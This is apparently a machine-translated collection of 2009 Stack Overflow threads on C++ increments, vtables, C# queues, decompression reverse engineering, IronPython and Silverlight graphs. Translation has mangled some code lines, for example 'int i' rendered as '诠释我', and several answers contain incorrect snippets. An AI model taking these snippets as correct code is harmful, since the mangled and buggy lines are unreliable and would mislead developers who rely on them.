## 回答 #3

> 赞同：7
> 
> 时间：2009-02-18T15:46:23.570

效率不应该是您关心的问题：它是*有意义*的。两者是*不*一样的，除非它们是独立的：一个操作值的前使用，另一个操作后。

诠释我; 我 = 1; cout << i++; //返回1

诠释我; 我 = 1; cout << ++i; //返回2

当含义不重要时，大多数编译器会将 ++i 和 i++（比如在 for 循环中）翻译成相同的机器/VM 代码。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-02-18T15:43:35.543

在现代编译器上并不重要。

```
int v = i++; 
```

是相同的

```
int v = i;
i = i + 1; 
```

现代编译器会发现它`v`没有被使用，并且计算的代码`v`是纯的（没有副作用）。然后它将删除`v`分配代码并生成此代码

```
i = i + 1; 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-02-18T15:45:19.020

这很重要！特别是如果您在使用自定义迭代器协议的 C++ 领域...

```
++i // the prefered way, unless..
auto j = i++ // this is what you need 
```

您应该使用前缀表示法来避免必要的复制开销，但它仅适用于迭代器，不适用于内置本机类型，无论如何这些只是一条指令。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-02-18T15:44:25.090

好吧，在 C++ 中，我相信它们有不同的用途，具体取决于您希望何时更新变量。

效率不应该决定你何时使用一个而不是另一个，但我认为它们将具有相同的效率。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-02-18T15:46:36.427

++i 对于 operator++ 的重要实现可能更有效，但即使在这种情况下，编译器也可能能够优化掉中间临时。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-02-18T15:49:53.110

++i 不需要临时变量来存储东西。这样想它们：

**++i**

```
int preIncrement(int i)
{
    i = i + 1;
    return i;
} 
```

**我++**

```
int i = 5; // as an example
int postIncrement(_i)
{
    int temp = _i;
    i = _i + 1;
    return temp;
} 
```

看？后增量需要一个临时变量。假设编译器不会为您解决所有问题，它几乎肯定会这样做。

当然，更重要的是程序逻辑；如果你太担心这个，你就有可能遇到[微优化剧院的悲惨悲剧……:)](http://www.codinghorror.com/blog/archives/001218.html)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-02-18T15:44:43.793

除非我遗漏了什么，否则它们应该具有相同的效率。它们都应该产生一个单一的添加指令。这只是添加指令发生位置的问题：在代码行的开头或结尾。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-02-18T15:45:46.833

++i 在没有优化的 x86 汇编中比 i++ 少占用一条处理器指令。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-02-18T15:46:30.233

没有区别。使用最有意义的结构。

如果您的应用程序运行缓慢，我可以向您保证，它永远不会因为整数增量操作的速度差异。如果是，那么它是编译器中的一个严重错误。应用程序中的速度问题将是算法效率低下、等待 I/O 等等。

不要担心你没有的问题。[过早的优化是万恶之源](https://en.wikipedia.org/wiki/Program_optimization#When_to_optimize)。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-02-18T15:47:29.607

`++i`更快，因为`i++`必须存储`i`，然后递增它，然后返回 的存储值`i`。`++i`只需递增`i`然后返回它。

```
// ++i
i += 1;
return i;

// i++
temp = i;
i += 1;
return temp; 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2009-02-18T15:47:49.310

一个独立的“i++;” 或“++i;” 应该生成同样有效的代码。如果您在表达式中使用它，则会出现差异，“副作用”会在其中发挥作用。

也就是说，有一段时间，在“全世界都是 Vax”的时候，编译器很烂，据说 ++i 比 i++ 更有效，即使在“for (i = 0; i < N; + +i)" 类型设置。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2009-02-18T15:48:34.457

这个 Stack Overflow 问题有一个很好的答案：*[C 中 i++ 和 ++i 之间是否存在性能差异？](https://stackoverflow.com/questions/24886/is-there-a-performance-difference-between-i-and-i)*

我想补充一点，您应该使用更适合您需求的那个。除了在最关键的应用程序中，它并不重要。从学术的角度来看，最好还是编写能够表达您需要并最终优化的代码。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2009-02-18T15:49:28.290

键入 i++ 通常更容易，因此在生产力时间方面更有效。

不过，说真的，如果*i*是本机数据类型（例如 int、double 等）——没有区别。

如果它是用户定义的类型，则取决于实现，例如

```
class Type
{
    Type& operator ++(){}
    const Type& operator ++(int i){}
};  

T i; 
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2009-02-18T15:49:43.720

没有正确或错误的答案。

因为它取决于：

1.  它是如何由编译器实现的。

2.  系统在哪个 CPU 上运行。

3.  if`i`是字节还是`i`双字

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2009-02-18T15:50:19.600

这取决于上下文，例如：

```
x = i++ 
```

在这种情况下，“x”将等于“i”，只有在那之后，“i”才会加一。

```
x = ++i 
```

在这种情况下，“i”将加一，然后“x”的新值将分配给“x”。

在“for”循环的情况下，除了性能之外几乎没有明显的差异（++i 更快）。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2009-02-18T15:50:50.910

一般来说，使用 ++i 比使用 i++ 更有效。这样做的简单原因是 ++i 与

我 += 1;

对于 x86 来说，它是一条指令（并且可能是大多数其他广泛使用的架构）。i++ 然而等于

tmp = 我; 我 += 1;

那是因为 'i' 的旧值是 i++ 的计算结果。显然，这比简单的 i += 1; 需要更多的工作；

但如上所述，这对足够聪明的编译器几乎没有影响，因为它将优化未使用的操作。对于许多解释型语言（例如：PHP）来说，++i 的速度增益可能很小；但这种增加可以忽略不计。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2009-02-18T15:54:02.460

Generally, in C++, postfix will require the additional construction of the object incremented, while prefix is applied directly to the object. (Or so I've read.)

As I am unable to attest to how the compiler handles it due to my limited knowledge on the matter, it could be handled for you making it a moot point.

* * *

## 回答 #20

> 赞同：-1
> 
> 时间：2009-02-18T15:52:50.530

很难准确回答这个问题，因为它取决于编译器/解释器的实现。

但一般来说，您可以说将 i++ 大致扩展为以下指令：

```
COPY i to tmp
INCREMENT tmp
SAVE tmp as i 
```

而 ++i 将大致扩展到：

```
LOAD i
INCREMENT i 
```

You can't just say that ++i is faster than i++ since language implementations are pretty smart and they can optimize these instructions when you know that you won't access the temporary value of i++. This usually happens in say a for loop. So in many cases it's just the same.

If you're trying to these kind of micro-optimizations I'd advice you to profile/measure before chosing one over another.

# c# - FileInfo[] 数组，希望将其添加到队列中，以便每个文件只处理一次并删除

> ID：561601
> 
> 赞同：0
> 
> 时间：2009-02-18T15:45:04.840
> 
> 标签：c#, loops, queue

我在对象 FileInfo[] 中有一个文件数组。

在我的服务中，我目前正在遍历文件并处理它们。

我想遍历文件，并在处理它们时将它们从集合中删除。

我认为队列是理想的选择，但是如何循环遍历队列集合？

（以前从未在 C# 中使用过队列）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T15:49:08.120

```
using System.Collections.Generic;

private void DoSomething(FileInfo [] files)
{
    Queue<FileInfo> f = new Queue<FileInfo>(files);

    while (f.Count > 0) {
        FileInfo current = f.Dequeue();

        // Process 'current'
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T15:48:04.067

您遍历队列的方式与遍历 C# 中的大多数其他集合的方式相同 - 使用`foreach`：

```
foreach (FileInfo file in queue)
{
    // Do stuff
} 
```

但是，如果您使用上面的代码，则不能将其添加到正文中的队列中。如果你想这样做，你应该这样做：

```
while (queue.Count > 0)
{
    FileInfo file = queue.Dequeue();
    // You can still use queue.Enqueue() here
} 
```

（这两个假设`queue`是类型`Queue<FileInfo>`。）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T15:48:36.047

使用 Queue 在处理它们时从队列中弹出项目。

```
while (queue.Count > 0) {
  T item = queue.Dequeue()
  ProcessItem(item)
} 
```

队列还实现了 IEnumberable，因此您也可以使用 foreach，但（通常）您不能修改您正在枚举的集合。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-18T15:50:06.277

```
Queue<FileInfo> q = new Queue<FileInfo>(yourFileInfoArray);

while (q.Count > 0)
{
    FileInfo fi = q.Dequeue();
    // do stuff with fi
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-18T15:51:19.143

另一种方法是简单地向后遍历 FileInfo 数组，然后弹出每个元素。

```
FileInfo[] f = ... 

for(int i = f.Length - 1; i >= 0; i--)
{
   // Do something
   f.RemoveAt[i];
} 
```

# algorithm - 识别二进制文件中的算法

> ID：561607
> 
> 赞同：2
> 
> 时间：2009-02-18T15:45:47.833
> 
> 标签：algorithm, compression, reverse-engineering

你们中是否有人知道在已编译的文件中识别算法的技术，例如通过测试某些模式的反汇编？

我所拥有的罕见信息是库中有一些（未导出）代码可以解压缩 Byte[] 的内容，但我不知道它是如何工作的。我有一些我认为以未知方式压缩的文件，看起来这些文件没有任何压缩头或尾。我假设没有加密，但只要我不知道如何解压缩，它对我来说毫无价值。

我拥有的库是用于低容量目标的 ARM9 二进制文件。

编辑：这是一种无损压缩，存储二进制数据或纯文本。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T19:10:07.653

你可以去几个方向，使用 IDA Pro 之类的静态分析，或者加载到 GDB 或模拟器中并按照这种方式执行代码。他们可能正在对数据进行异或运算以隐藏算法，因为已经有许多好的无损压缩技术。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-18T16:13:39.467

解压缩算法涉及紧密循环中的显着循环。您可能首先开始寻找循环（递减寄存器，如果不是 0，则向后跳转）。

鉴于它是一个小目标，您很有可能手动解码它，尽管现在看起来很难，一旦您深入研究它，您会发现您可以自己识别各种编程结构。

您也可以考虑将其反编译为更高级别的语言，这将比汇编更容易，但如果您不知道它是如何编译的，仍然很难。

[http://www.google.com/search?q=arm%20decompiler](http://www.google.com/search?q=arm%20decompiler)

-亚当

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-20T16:11:32.483

做到这一点的可靠方法是反汇编库并读取解压缩例程的结果汇编代码（并可能在调试器中单步执行）以查看它在做什么。

但是，您也许可以查看压缩文件的[幻数](http://en.wikipedia.org/wiki/Magic_number_(programming)#Magic_numbers_in_files)，从而确定使用了哪种压缩。例如，如果使用[DEFLATE](http://en.wikipedia.org/wiki/DEFLATE)压缩，前两个字节将是十六进制`78 9c`；如果使用[bzip2](http://en.wikipedia.org/wiki/DEFLATE) , `42 5a`; 如果使用[gzip](http://en.wikipedia.org/wiki/Gzip)，`1f 8b`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T16:59:55.190

通过查看程序集完成的逆向工程可能存在版权问题。特别是，从版权的角度来看，这样做来编写解压缩程序几乎和自己使用程序集一样糟糕。但后者要容易得多。因此，如果您的动机只是为了能够编写自己的解压缩实用程序，那么最好只移植您拥有的程序集。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-18T20:41:40.570

根据我的经验，大多数时候文件是使用普通的旧 Deflate 压缩的。您可以尝试使用 zlib 打开它们，从不同的偏移量开始以补偿自定义标头。问题是，zlib 本身添加了自己的头文件。在 python 中（我猜其他实现也具有该功能），您可以将 zlib.decompress -15 作为历史缓冲区大小（即 zlib.decompress(data,-15)）传递给它，这会导致它解压缩原始压缩数据, 没有 zlib 的头文件。

# c++ - 虚拟类的每个对象是否都有指向 vtable 的指针？

> ID：561624
> 
> 赞同：13
> 
> 时间：2009-02-18T15:47:43.583
> 
> 标签：c++, inheritance, vtable

虚拟类的每个对象是否都有指向 vtable 的指针？

还是只有带有虚函数的基类对象才有？

vtable 存储在哪里？进程的代码部分或数据部分？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-02-18T16:02:24.703

所有具有虚方法的类都将有一个由该类的所有对象共享的 vtable。

每个对象实例都有一个指向该 vtable 的指针（这就是找到 vtable 的方式），通常称为 vptr。编译器隐式生成代码来初始化构造函数中的 vptr。

请注意，这些都不是 C++ 语言强制要求的——如果需要，实现可以以其他方式处理虚拟调度。但是，这是我熟悉的每个编译器都使用的实现。Stan Lippman 的书“深入 C++ 对象模型”描述了它如何很好地工作。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-02-18T18:18:53.080

就像其他人所说的那样，C++ 标准没有强制使用虚拟方法表，但允许使用一个。我已经使用 gcc 和这段代码以及最简单的可能场景之一完成了我的测试：

```
class Base {
public: 
    virtual void bark() { }
    int dont_do_ebo;
};

class Derived1 : public Base {
public:
    virtual void bark() { }
    int dont_do_ebo;
};

class Derived2 : public Base {
public:
    virtual void smile() { }
    int dont_do_ebo;
};

void use(Base* );

int main() {
    Base * b = new Derived1;
    use(b);

    Base * b1 = new Derived2;
    use(b1);
} 
```

添加了数据成员以防止编译器将基类的大小设为零（称为空基类优化）。这是 GCC 选择的布局：（使用 -fdump-class-hierarchy 打印）

```
Vtable for Base
Base::_ZTV4Base: 3u entries
0     (int (*)(...))0
4     (int (*)(...))(& _ZTI4Base)
8     Base::bark

Class Base
   size=8 align=4
   base size=8 base align=4
Base (0xb7b578e8) 0
    vptr=((& Base::_ZTV4Base) + 8u)

Vtable for Derived1
Derived1::_ZTV8Derived1: 3u entries
0     (int (*)(...))0
4     (int (*)(...))(& _ZTI8Derived1)
8     Derived1::bark

Class Derived1
   size=12 align=4
   base size=12 base align=4
Derived1 (0xb7ad6400) 0
    vptr=((& Derived1::_ZTV8Derived1) + 8u)
  Base (0xb7b57ac8) 0
      primary-for Derived1 (0xb7ad6400)

Vtable for Derived2
Derived2::_ZTV8Derived2: 4u entries
0     (int (*)(...))0
4     (int (*)(...))(& _ZTI8Derived2)
8     Base::bark
12    Derived2::smile

Class Derived2
   size=12 align=4
   base size=12 base align=4
Derived2 (0xb7ad64c0) 0
    vptr=((& Derived2::_ZTV8Derived2) + 8u)
  Base (0xb7b57c30) 0
      primary-for Derived2 (0xb7ad64c0) 
```

如您所见，每个类都有一个 vtable。前两个条目是特殊的。第二个指向类的RTTI数据。第一个 - 我知道但忘记了。它在更复杂的情况下有一些用处。好吧，正如布局所示，如果你有一个 Derived1 类的对象，那么 vptr（v-table-pointer）当然会指向 Derived1 类的 v-table，它的函数 bark 正好有一个条目指向Derived1 的版本。Derived2 的 vptr 指向 Derived2 的 vtable，它有两个条目。另一个是它添加的新方法，微笑。它重复了 Base::bark 的条目，它当然会指向 Base 的函数版本，因为它是它的最衍生版本。

在完成一些优化后（构造函数内联，...），我还使用 -fdump-tree-optimized 转储了 GCC 生成的树。输出使用的是 GCC 的中端语言`GIMPL`，它是前端独立的，缩进到一些类似 C 的块结构中：

```
;; Function virtual void Base::bark() (_ZN4Base4barkEv)
virtual void Base::bark() (this)
{
<bb 2>:
  return;
}

;; Function virtual void Derived1::bark() (_ZN8Derived14barkEv)
virtual void Derived1::bark() (this)
{
<bb 2>:
  return;
}

;; Function virtual void Derived2::smile() (_ZN8Derived25smileEv)
virtual void Derived2::smile() (this)
{
<bb 2>:
  return;
}

;; Function int main() (main)
int main() ()
{
  void * D.1757;
  struct Derived2 * D.1734;
  void * D.1756;
  struct Derived1 * D.1693;

<bb 2>:
  D.1756 = operator new (12);
  D.1693 = (struct Derived1 *) D.1756;
  D.1693->D.1671._vptr.Base = &_ZTV8Derived1[2];
  use (&D.1693->D.1671);
  D.1757 = operator new (12);
  D.1734 = (struct Derived2 *) D.1757;
  D.1734->D.1682._vptr.Base = &_ZTV8Derived2[2];
  use (&D.1734->D.1682);
  return 0;    
} 
```

正如我们所看到的，它只是设置了一个指针——vptr——它将指向我们之前在创建对象时看到的适当的vtable。我还转储了用于创建 Derived1 和调用使用的汇编程序代码（$4 是第一个参数寄存器，$2 是返回值寄存器，$0 是始终为 0 的寄存器），然后使用`c++filt`工具对其中的名称进行解构:)

```
 # 1st arg: 12byte
    add     $4, $0, 12
      # allocate 12byte
    jal     operator new(unsigned long)    
      # get ptr to first function in the vtable of Derived1
    add     $3, $0, vtable for Derived1+8  
      # store that pointer at offset 0x0 of the object (vptr)
    stw     $3, $2, 0
      # 1st arg is the address of the object
    add     $4, $0, $2
    jal     use(Base*) 
```

如果我们想调用会发生什么`bark`？：

```
void doit(Base* b) {
    b->bark();
} 
```

GIMPL 代码：

```
;; Function void doit(Base*) (_Z4doitP4Base)
void doit(Base*) (b)
{
<bb 2>:
  OBJ_TYPE_REF(*b->_vptr.Base;b->0) (b) [tail call];
  return;
} 
```

`OBJ_TYPE_REF`是一个漂亮的 GIMPL 构造（它记录在`gcc/tree.def`gcc SVN 源代码中）

```
OBJ_TYPE_REF(<first arg>; <second arg> -> <third arg>) 
```

它的含义：使用`*b->_vptr.Base`对象上的表达式`b`，并存储前端（c++）特定的值`0`（它是 vtable 的索引）。`b`最后，它作为“this”参数传递。我们是否会调用出现在 vtable 中第二个索引处的函数（注意，我们不知道哪个 vtable 属于哪种类型！），GIMPL 看起来像这样：

```
OBJ_TYPE_REF(*(b->_vptr.Base + 4);b->1) (b) [tail call]; 
```

当然，这里又是汇编代码（堆栈框架的东西被切断了）：

```
 # load vptr into register $2 
  # (remember $4 is the address of the object, 
  #  doit's first arg)
ldw     $2, $4, 0
  # load whatever is stored there into register $2
ldw     $2, $2, 0
  # jump to that address. note that "this" is passed by $4
jalr    $2 
```

请记住 vptr 正好指向第一个函数。（在该条目之前存储了 RTTI 插槽）。因此，无论出现在该插槽中的什么都被调用。它还将调用标记为尾调用，因为它发生在我们`doit`函数中的最后一条语句。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-02-18T15:57:51.827

Vtable 是每个类的实例，即，如果我有一个类的 10 个对象，该类具有一个虚拟方法，则只有一个 vtable 在所有 10 个对象之间共享。

在这种情况下，所有 10 个对象都指向同一个 vtable。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-02-18T16:04:10.707

在家里试试这个：

```
#include <iostream>
struct non_virtual {}; 
struct has_virtual { virtual void nop() {} }; 
struct has_virtual_d : public has_virtual { virtual void nop() {} }; 

int main(int argc, char* argv[])
{
   std::cout << sizeof non_virtual << "\n" 
             << sizeof has_virtual << "\n" 
             << sizeof has_virtual_d << "\n";
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-02-18T20:37:57.083

要回答有关哪些对象（从现在开始的实例）具有 vtable 以及在哪里的问题，考虑何时需要 vtable 指针会很有帮助。

对于任何继承层次结构，您都需要为该层次结构中特定类定义的每组虚函数创建一个 vtable。换句话说，给定以下内容：

```
class A { virtual void f(); int a; };
class B: public A { virtual void f(); virtual void g(); int b; };
class C: public B { virtual void f(); virtual void g(); virtual void h(); int c; };
class D: public A { virtual void f(); int d; };
class E: public B { virtual void f(); int e; }; 
```

因此，您需要五个 vtable：A、B、C、D 和 E 都需要它们自己的 vtable。

接下来，您需要知道在给定特定类的指针或引用的情况下使用什么 vtable。例如，给定一个指向 A 的指针，您需要对 A 的布局有足够的了解，这样您才能获得一个告诉您在哪里调度 A::f() 的 vtable。给定一个指向 B 的指针，您需要对 B 的布局有足够的了解才能分派 B::f() 和 B::g()。等等等等。

一种可能的实现可以将 vtable 指针作为任何类的第一个成员。这意味着 A 实例的布局将是：

```
A's vtable;
int a; 
```

B 的一个实例是：

```
A's vtable;
int a;
B's vtable;
int b; 
```

您可以从此布局生成正确的虚拟调度代码。

您还可以通过组合具有相同布局或者一个是另一个的子集的 vtable 的 vtable 指针来优化布局。所以在上面的例子中，你也可以将 B 布局为：

```
B's vtable;
int a;
int b; 
```

因为 B 的 vtable 是 A 的超集。B 的 vtable 有 A::f 和 B::g 的条目，A 的 vtable 有 A::f 的条目。

为了完整起见，这是您将如何布局我们迄今为止看到的所有 vtable：

```
A's vtable: A::f
B's vtable: A::f, B::g
C's vtable: A::f, B::g, C::h
D's vtable: A::f
E's vtable: A::f, B::g 
```

实际的条目是：

```
A's vtable: A::f
B's vtable: B::f, B::g
C's vtable: C::f, C::g, C::h
D's vtable: D::f
E's vtable: E::f, B::g 
```

对于多重继承，你做同样的分析：

```
class A { virtual void f(); int a; };
class B { virtual void g(); int b; };
class C: public A, public B { virtual void f(); virtual void g(); int c; }; 
```

生成的布局将是：

```
A: 
A's vtable;
int a;

B:
B's vtable;
int b;

C:
C's A vtable;
int a;
C's B vtable;
int b;
int c; 
```

您需要指向与 A 兼容的 vtable 的指针和指向与 B 兼容的 vtable 的指针，因为对 C 的引用可以转换为对 A 或 B 的引用，并且您需要将虚函数分派给 C。

从这里你可以看到一个特定类拥有的 vtable 指针的数量至少是它派生的根类的数量（直接或由于超类）。根类是具有 vtable 的类，该类不继承自也具有 vtable 的类。

虚拟继承引发了另一种间接性，但您可以使用相同的度量来确定 vtable 指针的数量。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-02-18T17:28:15.777

VTable 是一个实现细节，语言定义中没有任何内容表明它存在。事实上，我已经阅读了实现虚拟功能的替代方法。

但是：所有常见的编译器（即我所知道的）都使用 VTabels。
好的。任何具有虚方法或从具有虚方法的类（直接或间接）派生​​的类都将具有带有指向 VTable 的指针的对象。

您提出的所有其他问题将取决于编译器/硬件，这些问题没有真正的答案。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-02-18T15:55:04.720

所有虚拟类通常都有一个 vtable，但 C++ 标准并不要求它，存储方法取决于编译器。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-02-18T15:59:03.900

每个多态类型的对象都会有一个指向 Vtable 的指针。

VTable 的存储位置取决于编译器。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-02-18T16:03:41.813

**不必要**

几乎每个具有虚函数的对象都会有一个 v-table 指针。对于每个具有派生对象的虚函数的类，不需要有一个 v-table 指针。

不过，在某些情况下，对代码进行充分分析的新编译器可能能够消除 v-tables。

例如，在一个简单的情况下：如果您只有一个抽象基类的具体实现，编译器知道它可以将虚拟调用更改为常规函数调用，因为每当调用虚拟函数时，它总是会解析为相同的功能。

此外，如果只有几个不同的具体函数，编译器可能会有效地更改调用位置，以便它使用“if”来选择要调用的正确具体函数。

因此，在这种情况下，不需要 v-table，并且对象最终可能没有 v-table。

# c# - 将python函数导入.NET语言？

> ID：561626
> 
> 赞同：5
> 
> 时间：2009-02-18T15:47:53.723
> 
> 标签：c#, python, ironpython

我是一名 C# .NET 程序员，正在学习 Python。我已经下载了 IronPython，并且知道它可以调用 .NET 库。

我想知道是否有相反的方法，即在我的 C# 代码中调用一些现有的“经典”Python 库，可能使用 .NET Interop。

我希望能够访问 pygame 等库中的函数。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-18T19:32:18.787

Ironpython 2.0 与 CPython 2.5 兼容，因此使用 <=2.5 API 的纯 Python 在 Ironpython 下应该可以正常工作。我相信 Ironpython 代码可以编译成 DLL。

对于像 Pygame 这样的 C 扩展，您可能想看看[Ironclad](http://code.google.com/p/ironclad/)。这是一个允许在 Ironpython 中使用 C 扩展的项目。这也可能为您提供您正在寻找的本机代码桥。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-19T05:12:58.063

您可以将[Python 用于 .Net](http://pythonnet.sourceforge.net/)，它允许您“使用 CLR 服务并继续使用现有的 Python 代码和基于 C 的扩展，同时保持 Python 代码的本机执行速度。”

此外，“该项目的一个关键目标是 .NET 的 Python 应该“**按照您在 Python 中所期望的方式工作**”，除了特定于 .NET 的情况（在这种情况下，目标是“只是你在 C# 中所期望的方式")。此外，随着 IronPython 项目获得关注，我的目标是为 IronPython 编写的代码无需修改即可在 Python for .NET 下运行。

希望这可以帮助

# c# - Navigating trees with LINQ to entities

> ID：561636
> 
> 赞同：1
> 
> 时间：2009-02-18T15:48:52.753
> 
> 标签：c#, linq, entity-framework

I have a table called Area, that stores areas in a hierarchical manner. There is an Id and a ParentId column in the table. The ParentId is linked with a foreign key to the table's Id column.

When I generate the EDM, I get two navigation properties, Area1 and Area2. How am I supposed to get back a tree structure of my areas, and navigate in the tree using LINQ to entities?

I may be asking the wrong question entirely, please bear with me. :)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T16:04:14.807

Its the right question. When you generate based of the database schema, LINQ autonames the child and parents.

I'd check the designer.cs for your model, but most likely Area1 is the child and Area2 is the Parent. Or its vice versa.

If you want to get all children of a current Area instance:

```
foreach (Area childArea in currentArea.Area1) {
    // do something
} 
```

If you want the parent:

```
Area parentArea = currentArea.Area2; 
```

I don't know if you can rename the child and parent, it should be possible. Just haven't dug much into that.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T16:06:17.580

I think that simply renaming the properties will eliminate most of your confusion. One of those properties is the children of the current instance; the other is the parent of the current instance. Look at the mapping details to figure out which is which. Then change the name of the properties to correspond to their function. Now the queries should be much easier to write.

# c# - 队列排序

> ID：561644
> 
> 赞同：1
> 
> 时间：2009-02-18T15:49:37.543
> 
> 标签：c#, queue

我有一个项目数组，排序后最旧的项目在数组中是第一个。

我想从数组中加载一个队列，这样当我弹出队列中的项目时，最旧的项目首先出现。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-02-18T15:51:26.070

使用 LINQ 到对象...

```
var q = new Queue<T>(array.OrderBy(d => d.date)); 
```

编辑：操作，错误的方式。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T07:53:25.473

你想要一个[优先队列](http://en.wikipedia.org/wiki/Priority_queue)。然后，您的传入项目是否已排序并不重要。

也许图书馆里有一个实现。

PS：在您的情况下，*优先级*将映射到*age*。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-18T16:00:38.950

如果您知道您的数组已经按最早排序，那么您可以使用：

```
Queue<YourType> q = new Queue<YourType>(yourSortedArray); 
```

如果数组未预先​​排序，则可以使用 LINQ 对其进行排序：

```
Queue<YourType> q =
    new Queue<YourType>(yourUnsortedArray.OrderBy(x => x.YourDateProperty)); 
```

然后你可以打电话`q.Dequeue`以从最旧到最新的顺序获取项目。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-18T15:53:37.877

尝试这个

```
public static T ArrayToQueue<T>(T[] items) {
  var queue = new Queue<T>();
  Array.ForEach(items, i => queue.Enqueue(i));
  return queue;
} 
```

# asp.net - 如何改进分配网格权限的方法

> ID：561649
> 
> 赞同：0
> 
> 时间：2009-02-18T15:50:16.073
> 
> 标签：asp.net, refactoring

我有一个 ASP.NET (VB.NET) 页面，上面有一个[Infragistics](http://www.infragistics.com/)网格。其中一列称为“状态”。

当我加载网格时，我在列级别设置字段的权限，授予用户角色（ENUM'UserTypes'）只读或读/写权限。

接下来，我需要遍历每一行并根据“状态”字段中的值（ENUM StatusVals）以及用户角色分配权限。

我已经完成了所有这些工作，但它看起来很笨重，我想改进它。

这是我传入一行的其中一种方法的快照，该行的记录状态以及用户类型和循环遍历单元格以分配权限和颜色。问题是：有没有更优雅的方法来做到这一点，这样当我添加它时，它就不会变成野兽？

```
 Private Shared Sub SetDetailRowReadWrite_ByStatusVal(ByVal DetailRow As
 ig.UltraGridRow, ByVal sv As StatusVals, ByVal UserType As UserRoles)
    If sv = StatusVals.Pending _
        OrElse sv = StatusVals.Released _
        OrElse sv = StatusVals.Shipped _
        OrElse sv = StatusVals.Consolidated _
        OrElse sv = StatusVals.HOLD _
        OrElse sv = StatusVals.Cancelled _
        OrElse sv = StatusVals.PartialShipped Then

        For Each column As ig.UltraGridCell In DetailRow.Cells
            If column.Key = "StatusVal" Then
                column.Style.BackColor = Drawing.Color.LightGreen
                column.Style.ForeColor = Drawing.Color.Black

                If UserType = UserRoles.Fulfillment Then
                    SetFulfillmentStatusValEditPermission(sv, column)
                End If
            ElseIf Not (sv = StatusVals.Consolidated AndAlso UserType = UserRoles.Fulfillment) Then
                column.Style.BackColor = Drawing.Color.White
                column.AllowEditing = ig.AllowEditing.No
            End If
        Next

        LockSizesRow(DetailRow, UserType, sv)

    ElseIf sv = StatusVals.Incomplete AndAlso UserType = UserRoles.Fulfillment Then
        For Each c As ig.UltraGridCell In DetailRow.Cells
            c.AllowEditing = UltraWebGrid.AllowEditing.No
        Next
    End If
End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-06-07T12:18:28.513

您可能想查看 ASP.Net（2.0 及更高版本）中的[LoginView](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.loginview.aspx)控件，它为您提供了一个将模板映射到 ASP.Net 角色的模板化控件，包括未登录（匿名）。

这个[QuickStarts](http://quickstarts.asp.net/quickstartv20/aspnet/doc/ctrlref/login/loginview.aspx)，虽然有点过时，但演示了一个简单的示例，但要点相当清楚。

# silverlight - Graph visualisation in Silverlight

> ID：561653
> 
> 赞同：6
> 
> 时间：2009-02-18T15:50:30.050
> 
> 标签：silverlight, tree, graph, prefuse

I have a data structure that represents a directed graph and I'm looking for a good Silverlight visualisation to allow me to navigate from node to node, preferably with some nice animation.

Does anyone know of any good UI controls or frameworks for this kind of display? Even a sample from another field (maybe a social network?). My graphs don't have many nodes so performance won't be an issue.

I've seen the [Prefuse](http://prefuse.org/gallery/) library for Java (and Flash) which would be ideal. The "Degree of Interest" visualisation is the kind of thing I'm after, but I can't find anything in Silverlight.

Thanks for any tips.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-18T16:55:14.000

There's an open source option that's part of the Silverlight Bag-O-Tricks. Check it out and see a demo here (use the first demo link):

[http://www.codeplex.com/BagOTricks](http://www.codeplex.com/BagOTricks)

There's also a WPF version:

[http://j832.com/bagotricks/](http://j832.com/bagotricks/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2010-07-19T18:06:14.307

Try this one [http://graphlight.codeplex.com/](http://graphlight.codeplex.com/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-05-19T17:23:07.267

I made a graph library for Silverlight, that uses Dot as basis. Please check out: [http://dot2silverlight.codeplex.com/](http://dot2silverlight.codeplex.com/)

I am making some improvements to support more shapes and types of arrows.

daniela

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-08-15T20:31:36.693
